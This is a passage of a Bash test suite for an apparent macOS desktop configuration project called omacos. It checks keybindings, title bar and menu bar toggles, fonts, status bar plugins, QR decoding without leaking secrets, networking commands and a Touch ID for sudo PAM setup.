    vim=$(sed -n "s/^alt-$letter | [^|]*| //p" "$KEYMAP" | head -1)
    arrowed=$(sed -n "s/^alt-$arrow | [^|]*| //p" "$KEYMAP" | head -1)
    [[ -n $vim && $vim == "$arrowed" ]] || { echo "alt-$letter is '$vim', alt-$arrow is '$arrowed'"; return 1; }
    vim=$(sed -n "s/^alt-shift-$letter | [^|]*| //p" "$KEYMAP" | head -1)
    arrowed=$(sed -n "s/^alt-shift-$arrow | [^|]*| //p" "$KEYMAP" | head -1)
    [[ -n $vim && $vim == "$arrowed" ]] || { echo "alt-shift-$letter is '$vim', alt-shift-$arrow is '$arrowed'"; return 1; }
  done
  return 0
}
check "arrows and hjkl agree" arrows_mirror_hjkl
# "switch focus and move the cursor to the center of the new application"
check "the mouse follows focus"        "grep -q \"^on-focus-changed = \\['move-mouse window-lazy-center'\\]\" $BASE"

# Super+Shift+Alt+N — send it away without going with it.
check "a window can be sent without following" \
  "grep -q '^alt-shift-cmd-1 |.*| move-node-to-workspace 1$' $KEYMAP"
check "sending and following are different keys" \
  "grep -q '^alt-shift-1 |.*--focus-follows-window 1$' $KEYMAP"

# Ctrl+Alt+Delete, and Super+Alt+F.
check "everything here can be closed" \
  "grep -qF \"alt-cmd-w | Close every window here | ['close-all-windows-but-current', 'close']\" $KEYMAP"
check "fullscreen has an edge-to-edge variant" \
  "grep -q '^alt-ctrl-f |.*| fullscreen --no-outer-gaps$' $KEYMAP"

# Super+Grave / Super+S: a scratchpad you can also leave the same way.
check "the scratchpad toggles"  "grep -q '^alt-s |.*| workspace --auto-back-and-forth S$' $KEYMAP"
check "the scratchpad persists" "grep -q 'persistent-workspaces = .*\"S\"' $XDG_CONFIG_HOME/aerospace/aerospace.toml"

# Super+Alt+1/2/3/4 — straight to one window rather than cycling to it.
check "the nth window here is bound" \
  "grep -q '^alt-ctrl-1 |.*| focus --dfs-index 0$' $KEYMAP"
check "the nth window counts from 1" \
  "grep -q '^alt-ctrl-4 |.*| focus --dfs-index 3$' $KEYMAP"

# Super+O: a window that follows you everywhere.
check "pinning is bound"        "grep -q '^alt-o |.*omacos-window-pin$' $KEYMAP"
check "pins are carried on a workspace change" "grep -q 'omacos-window-follow-pinned' $BASE"
check "pins are dropped at startup"            "grep -q 'omacos-window-pin clear' $BASE"

printf '\n\033[1mThe title bar\033[0m\n'
TB="$OMACOS_PATH/bin/omacos-toggle-titlebar"
GC="$OMACOS_PATH/config/ghostty/config.ghostty"
check "hidden is the shipped default" "grep -q '^macos-titlebar-style = hidden' $GC"
# `hidden` leaves a window macOS still treats as normal. `window-decoration =
# none` removes the frame and takes AeroSpace's grip on the window with it.
check "it does not strip decorations" "! grep -q '^window-decoration = none' $GC"
check "ghostty loads the generated file" "grep -q 'current/ghostty.conf' $GC"
check "it is loaded before yours" \
  "test \$(grep -n 'current/ghostty.conf' $GC | cut -d: -f1) -lt \$(grep -n 'local.ghostty' $GC | cut -d: -f1)"
check "the toggle writes only that key" "grep -q 'macos-titlebar-style = %s' $TB"
check "off restores a visible style"    "grep -q 'apply tabs' $TB"
check "an unknown verb is rejected"     "! omacos-toggle-titlebar bogus 2>/dev/null"
titlebar_round_trips() {
  omacos-toggle-titlebar on  >/dev/null 2>&1 || return 1
  omacos-toggle-titlebar status >/dev/null 2>&1 || return 1
  grep -q 'macos-titlebar-style = hidden' "$OMACOS_STATE/current/ghostty.conf" || return 1
  omacos-toggle-titlebar off >/dev/null 2>&1 || return 1
  ! omacos-toggle-titlebar status >/dev/null 2>&1
}
check "it round-trips"                  titlebar_round_trips
# Writing a setting into a file nothing reads looks exactly like a broken
# feature, so the command says so instead.
check "it warns when not included"      "grep -q 'does not load this yet' $TB"
valid_titlebar_value() {
  local ghostty=/Applications/Ghostty.app/Contents/MacOS/ghostty
  [[ -x $ghostty ]] || return 0
  # Ghostty names the valid values in its own error; hidden must be one.
  local out; out=$(printf 'macos-titlebar-style = hidden\n' > "$sandbox/tb.conf"; \
                   "$ghostty" +validate-config --config-file="$sandbox/tb.conf" 2>&1)
  [[ -z $out ]]
}
check "ghostty accepts hidden"          valid_titlebar_value
# Ghostty applies this one to new windows only, unlike the font settings which
# do update a running terminal. Advising a reload is advising a non-event.
check "it does not promise a reload"    "! grep -q 'Reload Config' $TB"
check "it says new window"              "grep -q 'new window' $TB"

printf '\n\033[1mFont size\033[0m\n'
check "size reads back"        "omacos-font-current --size | grep -qE '^[0-9]+$'"
check "size is settable"       "omacos-font-size 13 >/dev/null && test \"\$(omacos-font-current --size)\" = 13"
check "it lands in the include" "grep -q '^font-size = 13' $OMACOS_STATE/current/font.conf"
check "absurd sizes are refused" "! omacos-font-size 200 2>/dev/null && ! omacos-font-size 2 2>/dev/null"
check "non-numbers are refused"  "! omacos-font-size abc 2>/dev/null"
# Setting a family must not silently reset a size you chose.
size_survives_a_family_change() {
  omacos-font-size 15 >/dev/null 2>&1 || return 1
  local family; family=$(omacos-font-list | head -1)
  omacos-font-set "$family" >/dev/null 2>&1 || return 1
  [[ $(omacos-font-current --size) == 15 ]]
}
check "a family change keeps the size" size_survives_a_family_change

printf '\n\033[1mThe menu bar, honestly\033[0m\n'
MB="$OMACOS_PATH/bin/omacos-toggle-menubar"
# _HIHideMenuBar is read by the window server at login. Writing it succeeds and
# changes nothing until you log out, so a status that reads the preference
# agrees with itself and disagrees with the screen.
check "status measures, not reads"  "grep -q 'really_hidden' $MB"
check "the helper can measure it"   "grep -q 'case \"menubar\"' $OMACOS_PATH/default/swift/omacos-helper.swift"
check "it says a logout is needed"  "grep -q 'log out' $MB"
check "it offers the other way out" "grep -q 'bar position bottom' $MB"
# A bare call returning non-zero under `set -e` ends the script before it
# prints anything, which is how this shipped saying nothing at all.
check "the status call is guarded"  "grep -q 'really_hidden || seen=' $MB"
menubar_status_says_something() {
  local out; out=$(omacos-toggle-menubar status 2>&1 || true)
  [[ -n $out ]]
}
check "status always answers"       menubar_status_says_something

printf '\n\033[1mThe bar, and the other bar\033[0m\n'
BAR="$OMACOS_PATH/bin/omacos-bar"
check "position defaults to top"   "test \"\$(omacos-bar position)\" = top"
check "it moves"                   "omacos-bar position bottom >/dev/null && test \"\$(omacos-bar position)\" = bottom"
check "and moves back"             "omacos-bar position top >/dev/null && test \"\$(omacos-bar position)\" = top"
check "a bad edge is refused"      "! omacos-bar position sideways 2>/dev/null"
check "transparency toggles"       "omacos-bar transparent on >/dev/null && omacos-bar transparent status && omacos-bar transparent off >/dev/null && ! omacos-bar transparent status"
# Position lives in a generated file the seeded rc sources, so moving the bar
# never rewrites a config that is yours.
check "the rc reads the setting"   "grep -q 'current/bar.sh' $OMACOS_PATH/config/sketchybar/sketchybarrc"
check "position is not hardcoded"  "! grep -qE '^ +position=top' $OMACOS_PATH/config/sketchybar/sketchybarrc"
check "transparent is a colour"    "grep -q '0x00000000' $OMACOS_PATH/config/sketchybar/sketchybarrc"
# macOS draws a menu bar at the top too; two rows there looks like a bug.
check "doctor names the two bars"  "grep -q 'Two bars at the top' $OMACOS_PATH/bin/omacos-doctor"
# doctor had the same bug as the toggle: it read the preference, which says
# hidden while the bar is on screen, so it reported one bar when there were two.
check "doctor measures the menu bar" "grep -q 'omacos-helper\" menubar' $OMACOS_PATH/bin/omacos-doctor"
doctor_does_not_read_the_pref() {
  # Comments stripped: the line explaining why the preference is not read is
  # not a read of it. (This is the fourth time in this suite.)
  ! grep -vE '^[[:space:]]*#' "$OMACOS_PATH/bin/omacos-doctor" | grep -q '_HIHideMenuBar'
}
check "doctor does not read the pref" doctor_does_not_read_the_pref
check "it offers both ways out"    "grep -q 'toggle menubar' $OMACOS_PATH/bin/omacos-doctor && grep -q 'bar position bottom' $OMACOS_PATH/bin/omacos-doctor"

printf '\n\033[1mRestarts and the battery hook\033[0m\n'
RS="$OMACOS_PATH/bin/omacos-restart"
check "it states its usage"        "! omacos-restart 2>/dev/null && omacos-restart 2>&1 | grep -q 'wifi|bluetooth|audio'"
check "an unknown subsystem fails" "! omacos-restart printer 2>/dev/null"
# Wi-Fi power is the user's own switch; asking for root to flip it is wrong.
check "wifi needs no sudo"         "! grep -qE 'sudo .*(setairportpower)' $RS"
check "bluetooth prefers blueutil" "grep -q 'blueutil --power' $RS"
check "audio restarts coreaudiod"  "grep -q 'killall coreaudiod' $RS"
check "no terminal is explained"   "grep -q 'no terminal here to ask on' $RS"

BATT="$OMACOS_PATH/config/sketchybar/plugins/battery.sh"
check "the battery fires a hook"   "grep -q 'omacos-hook battery-low' $BATT"
# Edge-triggered, or a hook runs every two minutes until you find a charger.
check "it fires once per crossing" "grep -q 'battery-low-fired' $BATT"
check "charging clears the marker" "grep -q 'rm -f \"\$marker\"' $BATT"
check "the threshold is settable"  "grep -q 'OMACOS_BATTERY_LOW' $BATT"
check "a sample hook ships"        "test -f $OMACOS_PATH/config/omacos/hooks/battery-low.d/warn.sample"
# The plugin calls an omacos command, so it needs the same bootstrap as the rest.
check "the battery plugin bootstraps" "grep -q 'env-bootstrap' $BATT"

printf '\n\033[1mThe last small things\033[0m\n'
# --- the update badge -------------------------------------------------------
UC="$OMACOS_PATH/bin/omacos-cmd-update-check"
# ls-remote reads one ref and writes nothing. fetch or pull would move the tree
# under whatever command happens to be running.
update_check_never_writes() {
  # merge-base is a read-only query and has to survive the pattern that is
  # looking for merge. So do the mutating commands by exact word.
  ! grep -vE 'merge-base' "$UC" | grep -qE 'git [^|]*\b(fetch|pull|reset|merge|checkout|clone)\b'
}
check "the check never writes"    update_check_never_writes
check "it caches its answer"      "grep -q 'update-checked' $UC"
check "an ahead tree is not behind" "grep -q 'merge-base --is-ancestor' $UC"
# An unreachable remote is not an up-to-date machine.
check "no network keeps the last answer" "grep -q 'unreachable remote is not an update' $UC"
check "the bar has the item"      "grep -q 'add item update' $OMACOS_PATH/config/sketchybar/sketchybarrc"
# sketchybar's PATH depends on how it was started, and a launchd-started bar
# has none of omacos on it. A plugin that calls an omacos command and does not
# bootstrap first reports "command not found" — which for the update check is
# indistinguishable from "no update", and for a click is silence.
plugins_calling_omacos_bootstrap_first() {
  local plugin
  for plugin in "$OMACOS_PATH"/config/sketchybar/plugins/*.sh; do
    grep -qE '(^|[^-a-z])omacos-[a-z-]+' "$plugin" || continue
    grep -q 'env-bootstrap' "$plugin" || { echo "$(basename "$plugin") calls omacos without bootstrapping"; return 1; }
  done
  return 0
}
check "bar plugins bootstrap their PATH" plugins_calling_omacos_bootstrap_first
check "updating clears the badge" "grep -q 'update-available' $OMACOS_PATH/bin/omacos-update"
update_check_is_quiet_without_git() {
  local dir; dir=$(mktemp -d)
  # Not a git tree: there is no update to offer, and it must say so rather than
  # error into the bar plugin that calls it every half hour.
  OMACOS_PATH="$dir" omacos-cmd-update-check --force >/dev/null 2>&1
  local rc=$?
  rm -rf "$dir"
  ((rc == 1))
}
check "a non-git tree offers nothing" update_check_is_quiet_without_git

# --- low power mode ---------------------------------------------------------
LP="$OMACOS_PATH/bin/omacos-toggle-lowpower"
check "status needs no sudo"      "omacos-toggle-lowpower status >/dev/null 2>&1 || omacos-toggle-lowpower status 2>&1 | grep -q 'Low Power Mode'"
check "it reads pmset, not guesses" "grep -q 'pmset -g custom' $LP"
check "it sets both power sources"  "grep -q 'pmset -a lowpowermode' $LP"
check "no terminal is explained"    "grep -q 'no terminal to ask on' $LP"
check "an unknown verb is rejected" "! omacos-toggle-lowpower bogus 2>/dev/null"

# --- the debug report -------------------------------------------------------
DBG="$OMACOS_PATH/bin/omacos-debug"
DEBUG_OUT=$(omacos-debug --stdout 2>/dev/null)
check "it reports something"      "test -n \"\$DEBUG_OUT\""
check "it has the sections"       "grep -q '## Machine' <<<\"\$DEBUG_OUT\" && grep -q '## Versions' <<<\"\$DEBUG_OUT\""
# It is written to be pasted into a public issue.
check "no escape codes survive"   "! printf '%s' \"\$DEBUG_OUT\" | grep -q \$'\033'"
debug_leaks_no_local_env_values() {
  local env_file="$OMACOS_CONFIG/local.env" value
  printf 'SECRET_CANARY=hunter2-do-not-leak\n' >> "$env_file"
  local out; out=$(omacos-debug --stdout 2>/dev/null)
  sed -i '' '/SECRET_CANARY/d' "$env_file"
  # The key may be named. The value may never be.
  [[ $out == *SECRET_CANARY* ]] || return 1
  [[ $out != *hunter2-do-not-leak* ]]
}
check "it names keys, never values" debug_leaks_no_local_env_values
check "tmux is asked with -V"     "grep -q 'tmux -V' $DBG"
check "ghostty is found in its bundle" "grep -q 'Ghostty.app/Contents/MacOS/ghostty' $DBG"

# --- the three packages -----------------------------------------------------
check "tldr ships"   "grep -q '^brew \"tldr\"' $OMACOS_PATH/Brewfile"
check "yt-dlp ships" "grep -q '^brew \"yt-dlp\"' $OMACOS_PATH/Brewfile"
check "try ships"    "grep -q '^brew \"try\"' $OMACOS_PATH/Brewfile"

# --- the prompt -------------------------------------------------------------
check "a starship config is seeded" "test -f $OMACOS_PATH/config/starship.toml"
check "the prompt parses"           "python3 -c \"import tomllib,sys; tomllib.load(open('$OMACOS_PATH/config/starship.toml','rb'))\""
# Colours come from the terminal, which omacos themes; a second palette here
# would drift out of step with `omacos theme set`.
check "the prompt sets no palette"  "! grep -qE '^\[palettes' $OMACOS_PATH/config/starship.toml"

printf '\n\033[1mTranscode\033[0m\n'
TR="$OMACOS_PATH/bin/omacos-transcode"
check "it is bound to a key"  "grep -q '^alt-ctrl-period |.*omacos-transcode' $OMACOS_PATH/config/omacos/keymap.conf"
check "it is in the menu"     "jq -e '.\"capture.transcode\"' $OMACOS_PATH/default/menu.json"
# sips and avconvert both ship with macOS. Needing ffmpeg would make this the
# one capture command with a dependency.
check "pictures go through sips"      "grep -q 'sips -s format' $TR"
check "video goes through avconvert"  "grep -q 'avconvert --source' $TR"
no_ffmpeg_dependency() {
  # Comments and messages both mention it — the command explains why it will
  # not install ffmpeg. Depending on it would mean running it.
  ! grep -vE '^[[:space:]]*#|echo |printf ' "$TR" | grep -qE '\bffmpeg\b'
}
check "no ffmpeg dependency"  no_ffmpeg_dependency
check "the caps match Omarchy's" "grep -q '3160' $TR && grep -q '2160' $TR && grep -q '1080' $TR"
check "bad size is rejected"  "! omacos-transcode /etc/hosts jpg enormous 2>/dev/null"
check "a missing file is rejected" "! omacos-transcode /nope/nothing.png jpg low 2>/dev/null"

# A transcoder that quietly hands back a bigger file is worse than useless: it
# happens whenever the source is already smaller, or in a better codec.
check "growth is reported, not hidden" "grep -q 'bigger, not smaller' $TR"

transcode_shrinks_a_picture() {
  local dir; dir=$(mktemp -d)
  # A 2000x1200 PNG, written without any image library.
  python3 - "$dir/in.png" <<'PYEOF'
import sys, zlib, struct
w, h = 2000, 1200
raw = b"".join(b"\x00" + bytes([(x * 7 + y * 3) % 256 for x in range(w) for _ in (0,)]) for y in range(h))
def chunk(t, d):
    c = t + d
    return struct.pack(">I", len(d)) + c + struct.pack(">I", zlib.crc32(c) & 0xffffffff)
png = (b"\x89PNG\r\n\x1a\n"
       + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 0, 0, 0, 0))
       + chunk(b"IDAT", zlib.compress(raw, 6))
       + chunk(b"IEND", b""))
open(sys.argv[1], "wb").write(png)
PYEOF
  [[ -s $dir/in.png ]] || { rm -rf "$dir"; return 1; }
  omacos-transcode "$dir/in.png" jpg low >/dev/null 2>&1 || { rm -rf "$dir"; return 1; }
  local out="$dir/in-low.jpg" width format
  [[ -f $out ]] || { rm -rf "$dir"; return 1; }
  # The low cap is 1080 wide and the source is 2000, so this is the promise.
  # Not the file size: that depends on the picture, and a smooth gradient is
  # smaller as a PNG than as any JPEG of it.
  width=$(sips -g pixelWidth "$out" 2>/dev/null | awk '/pixelWidth/ {print $2}')
  format=$(sips -g format "$out" 2>/dev/null | awk '/format:/ {print $2}')
  rm -rf "$dir"
  [[ $width == 1080 && $format == jpeg ]]
}
check "a picture is capped and converted" transcode_shrinks_a_picture

# The output goes on the pasteboard as a file, so pasting into Mail attaches it
# rather than typing its path.
check "the result is copied as a file" "grep -q 'copy-file' $TR"
copy_file_puts_a_real_file_on_the_pasteboard() {
  local helper="$OMACOS_STATE/bin/omacos-helper"
  [[ -x $helper ]] || return 0
  local f="$sandbox/pasteme.txt"; echo hi > "$f"
  "$helper" copy-file "$f" >/dev/null || return 1
  # Both: the file for Mail and Finder, the path for a text field.
  [[ $(pbpaste) == "$f" ]]
}
check "copy-file carries path and file" copy_file_puts_a_real_file_on_the_pasteboard

printf '\n\033[1mQR decode\033[0m\n'
QRC="$OMACOS_PATH/bin/omacos-capture-qr"
HELPER="$OMACOS_STATE/bin/omacos-helper"
check "it is bound to a key"   "grep -q '^alt-ctrl-shift-o |.*omacos-capture-qr' $OMACOS_PATH/config/omacos/keymap.conf"
check "it is in the menu"      "jq -e '.\"capture.qr\"' $OMACOS_PATH/default/menu.json"
# The screenshot holds the code, so it is as sensitive as the code.
check "the screenshot is cleaned up" "grep -q \"trap 'rm -rf\" $QRC"
# pbcopy cannot mark an entry concealed, and a value that reaches the shell has
# already been somewhere it should not be. The helper writes the clipboard.
# Comments stripped: the header explains why pbcopy is not used, and saying so
# is not using it. (Third time this exact trap has been walked into.)
shell_never_sees_the_value() {
  ! grep -vE '^[[:space:]]*#' "$QRC" | grep -q 'pbcopy'
}
check "the shell never sees the value" shell_never_sees_the_value
check "only the kind is reported"      "grep -q 'kind=' $QRC"

qr_decode_round_trip() {
  [[ -x $HELPER ]] || return 0          # no helper on CI
  command -v swiftc >/dev/null 2>&1 || return 0
  local dir; dir=$(mktemp -d)
  cat > "$dir/mk.swift" <<'SWIFT'
import CoreImage
import AppKit
import Foundation
let a = Array(CommandLine.arguments.dropFirst())
let f = CIFilter(name: "CIQRCodeGenerator")!
f.setValue(Data(a[0].utf8), forKey: "inputMessage")
f.setValue("M", forKey: "inputCorrectionLevel")
let rep = NSBitmapImageRep(ciImage: f.outputImage!.transformed(by: CGAffineTransform(scaleX: 10, y: 10)))
try! rep.representation(using: .png, properties: [:])!.write(to: URL(fileURLWithPath: a[1]))
SWIFT
  swiftc -O "$dir/mk.swift" -o "$dir/mk" 2>/dev/null || { rm -rf "$dir"; return 0; }

  local secret="otpauth://totp/Test:me?secret=TESTSEEDVALUE123"
  "$dir/mk" "$secret" "$dir/q.png"
  local out; out=$("$HELPER" qr-decode "$dir/q.png" 2>&1)

  # It must say what kind of thing it was, and never the thing itself.
  [[ $out == *"one-time-password"* ]] || { rm -rf "$dir"; return 1; }
  [[ $out != *TESTSEEDVALUE123* ]]    || { rm -rf "$dir"; return 1; }
  # And it must actually be on the clipboard, or the command did nothing.
  [[ $(pbpaste) == "$secret" ]]       || { rm -rf "$dir"; return 1; }

  # A picture with no code in it is an answer, not a crash.
  "$dir/mk" "x" "$dir/blank.png"
  : > "$dir/empty.png"
  "$HELPER" qr-decode "$dir/empty.png" >/dev/null 2>&1 && { rm -rf "$dir"; return 1; }
  rm -rf "$dir"
  return 0
}
check "it decodes without leaking" qr_decode_round_trip

# Vision reads 1D barcodes too, and dense screen content false-positives as one
# readily. A wrong answer here is worse than no answer.
# A usage line that stops being updated is how a working binary gets mistaken
# for a stale one.
helper_usage_lists_every_subcommand() {
  local usage
  usage=$(grep -o 'usage: omacos-helper <[^"]*>' "$OMACOS_PATH/default/swift/omacos-helper.swift" | head -1)
  local verb
  for verb in ocr color clipboard fonts qr qr-decode; do
    [[ $usage == *"$verb"* ]] || { echo "usage omits $verb: $usage"; return 1; }
  done
}
check "the helper's usage is current" helper_usage_lists_every_subcommand
check "it looks for QR codes only" "grep -q 'symbologies = \[.qr\]' $OMACOS_PATH/default/swift/omacos-helper.swift"
# The convention every clipboard manager honours, and the one omacos's own
# watcher already skips.
check "the entry is marked concealed" "grep -q 'org.nspasteboard.ConcealedType' $OMACOS_PATH/default/swift/omacos-helper.swift"

printf '\n\033[1mNetworking\033[0m\n'
NET="$OMACOS_PATH/bin/omacos-network"
check "it states its usage"       "! omacos-network 2>/dev/null && omacos-network 2>&1 | grep -q 'speedtest|dns'"
check "dns reads without sudo"    "omacos-network dns | grep -qE 'DHCP|:'"
check "dns names three providers" "grep -qE '\\[Cc\\]loudflare' $NET && grep -qE '\\[Gg\\]oogle' $NET && grep -qE '\\[Qq\\]uad9' $NET"
# Both addresses of each, so losing one resolver is not losing DNS.
check "each provider has two"     "grep -q '1.1.1.1 1.0.0.1' $NET && grep -q '8.8.8.8 8.8.4.4' $NET"
# A DNS change that leaves the old answers cached looks like it did nothing.
check "it flushes the cache"      "grep -q 'dscacheutil -flushcache' $NET && grep -q 'killall -HUP mDNSResponder' $NET"
# The service carrying the default route, not whichever is listed first.
check "it picks the routed service" "grep -q 'route -n get default' $NET"
check "speedtest uses the built-in" "grep -q 'networkQuality' $NET"
# Comments stripped: the header says out loud which tools it deliberately does
# not need, and that sentence is not a dependency.
no_speedtest_dependency() {
  ! grep -vE '^[[:space:]]*#' "$NET" | grep -qE 'speedtest-cli|fast-cli|speedtest\.net'
}
check "no speedtest-cli dependency" no_speedtest_dependency

# Since macOS 14 the SSID is location data, and a terminal without Location
# Services permission is told "<redacted>" on a Mac that is plainly connected.
check "a redacted ssid is not a name" "grep -q 'redacted' $NET"
check "it says why, and what to do"   "omacos-network qr 2>&1 | grep -q 'Location' || omacos-network qr 2>&1 | grep -q 'ssid'"
check "an unknown network fails clean" "! omacos-network password NoSuchNetworkHere12345 2>/dev/null"

# The QR payload is a format every phone camera parses, and its separators are
# legal characters in both an SSID and a password.
check "the wifi payload is escaped" "grep -q 'escape' $NET && grep -qF 'WIFI:S:' $NET"
check "the helper can draw one"     "test -x $OMACOS_STATE/bin/omacos-helper && $OMACOS_STATE/bin/omacos-helper qr hello | grep -q . || true"
qr_is_black_on_white() {
  local helper="$OMACOS_STATE/bin/omacos-helper"
  [[ -x $helper ]] || return 0   # nothing built on CI
  # Explicit colours, or a dark terminal renders it inverted and phones refuse it.
  "$helper" qr "hello" | grep -q $'\033\[30;47m'
}
check "a QR is drawn black on white" qr_is_black_on_white

printf '\n\033[1mFonts\033[0m\n'
FONTSTATE="$OMACOS_STATE/current"
check "font list names families"  "omacos-font-list | grep -q ."
check "the catalog carries fonts" "omacos-app-list font | grep -q '^font\.'"
check "every font is a cask"      "test \$(jq -r '[.[] | select(.category==\"font\") | .source] | unique | join(\",\")' $OMACOS_PATH/default/apps.json) = cask"
check "an unknown family is refused" "! omacos-font-set 'No Such Font Family' 2>/dev/null"
check "it says how to get one"    "omacos-font-set 'No Such Font Family' 2>&1 | grep -q 'omacos install app font'"

font_set_writes_all_three() {
  local family
  family=$(omacos-font-list | head -1)
  [[ -n $family ]] || return 1
  omacos-font-set "$family" >/dev/null 2>&1 || return 1
  [[ -f $FONTSTATE/font.name && -f $FONTSTATE/font.conf && -f $FONTSTATE/font.sh ]] || return 1
  grep -qF "$family" "$FONTSTATE/font.conf" && grep -qF "$family" "$FONTSTATE/font.sh"
}
check "setting one writes all three" font_set_writes_all_three
check "current reads it back"     "test \"\$(omacos-font-current)\" = \"\$(omacos-font-list | head -1)\""

# font-family is a LIST in Ghostty: assigning it again appends a fallback
# rather than replacing the primary, so without an empty reset first the seeded
# default keeps rendering and the only symptom is that nothing changed.
check "ghostty's list is reset first" \
  "head -3 $FONTSTATE/font.conf | grep -qE '^font-family = *$'"
check "the reset precedes the value" \
  "test \$(grep -n 'font-family = *$' $FONTSTATE/font.conf | head -1 | cut -d: -f1) -lt \$(grep -n 'font-family = \"' $FONTSTATE/font.conf | head -1 | cut -d: -f1)"

# Both seeded configs have to actually load what is generated, or setting a
# font writes three files that nothing reads.
check "ghostty loads the font file"   "grep -q 'current/font.conf' $OMACOS_PATH/config/ghostty/config.ghostty"
check "ghostty loads it before yours" \
  "test \$(grep -n 'current/font.conf' $OMACOS_PATH/config/ghostty/config.ghostty | cut -d: -f1) -lt \$(grep -n 'local.ghostty' $OMACOS_PATH/config/ghostty/config.ghostty | cut -d: -f1)"
check "the bar loads the font file"   "grep -q 'current/font.sh' $OMACOS_PATH/config/sketchybar/sketchybarrc"
check "a font-set hook can run"       "test -f $OMACOS_PATH/config/omacos/hooks/font-set.d/reload-apps.sample"
check "font set fires the hook"       "grep -q 'omacos-hook font-set' $OMACOS_PATH/bin/omacos-font-set"

printf '\n\033[1mBar indicators\033[0m\n'
BARP="$OMACOS_PATH/config/sketchybar/plugins"
# A fake sketchybar that echoes its arguments, so a plugin can be run and read.
mkdir -p "$sandbox/fakebin"
printf '#!/usr/bin/env bash\nprintf "sketchybar"; for a in "$@"; do printf " %%s" "$a"; done; printf "\\n"\n' \
  > "$sandbox/fakebin/sketchybar"
chmod +x "$sandbox/fakebin/sketchybar"
plug() { PATH="$sandbox/fakebin:$PATH" NAME="$1" bash "$BARP/$1.sh" 2>&1; }

check "the bar declares both items"  "grep -q 'add item reminders' $OMACOS_PATH/config/sketchybar/sketchybarrc && grep -q 'add item nightshift' $OMACOS_PATH/config/sketchybar/sketchybarrc"
check "both have events"             "grep -q 'add event omacos_reminders' $OMACOS_PATH/config/sketchybar/sketchybarrc && grep -q 'add event omacos_nightshift' $OMACOS_PATH/config/sketchybar/sketchybarrc"
# Without the initial trigger an indicator sits blank until the state next
# changes — which for a pending reminder could be never.
check "both are drawn at startup"    "grep -q 'trigger omacos_reminders' $OMACOS_PATH/config/sketchybar/sketchybarrc && grep -q 'trigger omacos_nightshift' $OMACOS_PATH/config/sketchybar/sketchybarrc"
check "both answer clicks"           "grep -q 'reminders.left' $BARP/click.sh && grep -q 'nightshift' $BARP/click.sh"

check "nothing pending draws nothing" "XDG_STATE_HOME=\$(mktemp -d) plug reminders | grep -q 'drawing=off'"
reminders_indicator_counts() {
  # Its own state directory, not the sandbox's: a later check asserts that
  # `omacos reminder clear` clears exactly one, and fixtures left here by this
  # one would be counted by that. $$ rather than a background sleep, so the
  # "still pending" pid is alive by construction and nothing has to be reaped
  # on the way out.
  local home; home=$(mktemp -d)
  local dir="$home/omacos/reminders" out
  mkdir -p "$dir"
  printf '%s\t%s\t%s\n' "$(( $(date +%s) + 300 ))" "$$" "Tea"  > "$dir/a"
  printf '%s\t%s\t%s\n' "$(( $(date +%s) + 90 ))"  "$$" "Call" > "$dir/b"
  # A reminder whose process is gone has already fired: reaped, not counted.
  printf '%s\t%s\t%s\n' "$(( $(date +%s) + 60 ))" 999999 "Ghost" > "$dir/c"
  out=$(PATH="$sandbox/fakebin:$PATH" NAME=reminders XDG_STATE_HOME="$home" \
        bash "$BARP/reminders.sh" 2>&1)
  # Nearest first, rounded up, and the dead one neither counted nor kept.
  [[ $out == *"label=2m ·2"* && ! -f $dir/c ]]
  local verdict=$?
  rm -rf "$home"
  return $verdict
}
check "it counts and reaps"          reminders_indicator_counts

# Night Shift has no readable preference on macOS, so the indicator draws only
# when the nightlight CLI can answer. Guessing would be worse than staying dark.
check "no nightlight CLI, no glyph"  "plug nightshift | grep -q 'drawing=off'"
nightshift_follows_the_cli() {
  local on off
  printf '#!/usr/bin/env bash\necho "Night Shift is on"\n' > "$sandbox/fakebin/nightlight"
  chmod +x "$sandbox/fakebin/nightlight"
  on=$(plug nightshift)
  printf '#!/usr/bin/env bash\necho "Night Shift is off"\n' > "$sandbox/fakebin/nightlight"
  off=$(plug nightshift)
  rm -f "$sandbox/fakebin/nightlight"
  [[ $on == *drawing=on* && $off == *drawing=off* ]]
}
check "it follows the CLI both ways" nightshift_follows_the_cli

# The state changes in a detached process that outlives the one that scheduled
# it, so the trigger has to be in there too or the bar counts down a reminder
# that already went off.
check "a fired reminder redraws the bar" "grep -q 'trigger omacos_reminders' $OMACOS_PATH/bin/omacos-reminder"
check "setting one redraws the bar"      "test \$(grep -c 'omacos_reminders' $OMACOS_PATH/bin/omacos-reminder) -ge 2"
check "toggling night shift redraws"     "grep -q 'trigger omacos_nightshift' $OMACOS_PATH/bin/omacos-toggle-nightlight"

printf '\n\033[1mTouch ID for sudo\033[0m\n'
TID="$OMACOS_PATH/bin/omacos-setup-touchid"
# status is read-only and must never need root, on a Mac with the sensor or
# without one — CI runs on a VM that has none.
check "status needs no root"     "omacos-setup-touchid status >/dev/null 2>&1 || omacos-setup-touchid status 2>&1 | grep -q 'Touch ID'"
check "off is a no-op when unset" "test ! -f /etc/pam.d/sudo_local && omacos-setup-touchid off | grep -q 'not set up' || true"
check "an unknown verb is rejected" "! omacos-setup-touchid bogus 2>/dev/null"
# `shift` with nothing to shift fails, and under `set -e` the script died before
# printing anything — for the plainest possible invocation.
check "no arguments still says something" \
  "test -n \"$(omacos-setup-touchid </dev/null 2>&1)\""
check "it explains a missing terminal" \
  "omacos-setup-touchid </dev/null 2>&1 | grep -q 'no terminal'"
check "--no-tmux is accepted"        "omacos-setup-touchid --no-tmux </dev/null 2>&1 | grep -qv 'usage:'"
# The module that makes tmux work lives somewhere the user can write, and that
# is a real trade-off rather than an implementation detail.
check "the reattach trade-off is stated" "grep -q 'can write to' $TID"

# This writes into /etc/pam.d, so the properties that keep it safe are asserted
# rather than trusted. Each one is load-bearing:
#   sudo_local   — /etc/pam.d/sudo is left alone and survives system updates
#   sufficient   — Touch ID failing falls through to the password rules
#   444 root     — PAM ignores a file anyone but root can write
#   the marker   — `off` will not delete a sudo_local omacos did not write
#   the probe    — sudo is proven to still work, and rolled back if it is not
check "it writes sudo_local, not sudo" "grep -q 'SUDO_LOCAL=/etc/pam.d/sudo_local' $TID"
check "it never edits /etc/pam.d/sudo" "! grep -qE '(tee|mv|rm|chmod|chown)[^|]*/etc/pam\.d/sudo\b' $TID"
check "pam_tid is sufficient, not required" "grep -q 'auth       sufficient     pam_tid.so' $TID"
check "nothing is marked required"   "! grep -q 'auth.*required.*pam_' $TID"
check "the file is root-owned 444"   "grep -q 'chmod 444' $TID && grep -q 'chown root:wheel' $TID"
